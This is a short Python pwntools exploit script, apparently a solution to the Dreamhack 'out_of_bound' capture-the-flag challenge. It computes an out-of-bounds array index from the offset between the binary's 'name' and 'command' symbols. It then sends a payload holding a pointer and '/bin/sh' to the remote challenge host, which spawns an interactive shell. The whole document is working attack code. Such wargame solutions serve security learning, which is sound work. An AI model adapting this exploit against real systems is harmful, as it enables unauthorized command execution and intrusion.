from pwn import *

#p = process('out_of_bound')
#gdb.attach(p ,gdb_args=['-q', '-ex init-pwngdb'])
p = remote('host1.dreamhack.games', 20356)

context.clear()
context.update(arch='i386', os='linux')
context.log_level='debug'

e = ELF('./out_of_bound')
name = e.symbols['name']
command = e.symbols['command']

idx = (name - command)/4
payload = p32(name+0x4)
payload += "/bin/sh"

p.sendafter('Admin name: ', payload)
p.sendafter('What do you want?: ', str(idx))

p.interactive()
